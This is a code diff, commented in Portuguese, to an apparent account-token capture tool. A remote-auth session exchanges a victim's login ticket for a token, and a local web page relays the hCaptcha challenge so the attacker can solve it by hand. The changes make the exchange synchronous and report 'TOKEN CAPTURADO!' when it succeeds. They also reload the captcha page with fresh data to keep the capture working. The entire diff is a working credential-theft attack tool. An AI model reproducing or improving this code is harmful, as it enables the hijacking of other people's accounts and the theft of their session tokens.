@@ -184,12 +184,14 @@ class RemoteAuthSession(threading.Thread):
 
     def try_exchange(self, ticket, captcha_key=None, captcha_rqtoken=None,
                      attempts=2):
+        last = None
         for _ in range(attempts):
             try:
                 r = self.do_exchange(ticket, captcha_key, captcha_rqtoken)
+                last = r
                 if r.status_code == 200:
                     self.finish_token(r)
-                    return
+                    return r
                 j = r.json()
                 if j.get("captcha_key"):
                     # registra p/ resolucao manual pelo atacante
@@ -211,7 +213,7 @@ class RemoteAuthSession(threading.Thread):
                     base = turl or f"http://{lan_ip()}:8080"
                     print(f"[captcha] resolva em {base}/captcha/{sid} "
                           f"(ou http://localhost:8080/captcha/{sid})", flush=True)
-                    return
+                    return r
                 time.sleep(2)
             except Exception as e:
                 print("EXCHANGE_ERR:", repr(e)[:150], flush=True)
@@ -222,6 +224,7 @@ class RemoteAuthSession(threading.Thread):
             self.ws.close()
         except Exception:
             pass
+        return last
 
     def on_message(self, w, message):
         try:
@@ -593,9 +596,16 @@ function done(key, ekey){{
     body: JSON.stringify({{sid:'{sid}', key:key, ekey:(ekey||'')}})}})
    .then(r=>r.json())
    .then(j=>{{ document.getElementById('res').textContent =
-       j.ok ? 'OK! ' + (j.armado or 'captcha aceito — pode fechar esta aba.') :
-              'falhou: '+JSON.stringify(j); }});
+       j.ok ? (j.msg || (j.armado || 'OK! captcha aceito — pode fechar esta aba.')) :
+              'falhou: ' + (j.msg || JSON.stringify(j)); }});
 }}
+// se a caixa do hCaptcha nao renderizar em 8s, recarrega (rqdata fresco)
+setTimeout(function(){{
+  var el = document.getElementById('hcap');
+  if (el && el.childElementCount === 0 && !el.querySelector('iframe')) {{
+    location.reload();
+  }}
+}}, 8000);
 function tryRender(){{
   if (window.hcaptcha) {{
     hcaptcha.render('hcap', {{
@@ -683,7 +693,9 @@ class Handler(BaseHTTPRequestHandler):
             if not c:
                 self._html("sessao de captcha nao encontrada", 404)
             else:
-                self._html(captcha_page(sid, c["sitekey"], c["rqdata"]))
+                # rqdata FRESCO na hora que a pagina abre (o antigo expira)
+                sitekey, rqdata = arm_probe()
+                self._html(captcha_page(sid, sitekey, rqdata))
         else:
             self._html("not found", 404)
 
@@ -725,10 +737,14 @@ class Handler(BaseHTTPRequestHandler):
                 self._json({"ok": False, "erro": "sessao/chave invalida"})
                 return
             CAPTCHAS.pop(sid, None)
-            threading.Thread(target=c["session"].try_exchange,
-                             args=(c["ticket"], key, ekey, 1),
-                             daemon=True).start()
-            self._json({"ok": True})
+            # sincrono: a pagina espera e mostra o resultado REAL
+            r = c["session"].try_exchange(c["ticket"], key, ekey, 1)
+            if r is not None and r.status_code == 200:
+                self._json({"ok": True, "msg": "TOKEN CAPTURADO! 🎉"})
+            else:
+                self._json({"ok": False,
+                            "status": getattr(r, "status_code", None),
+                            "msg": "troca falhou — veja o console"})
         elif u.path == "/api/arm":
             key = data.get("key")
             ekey = data.get("ekey", "")
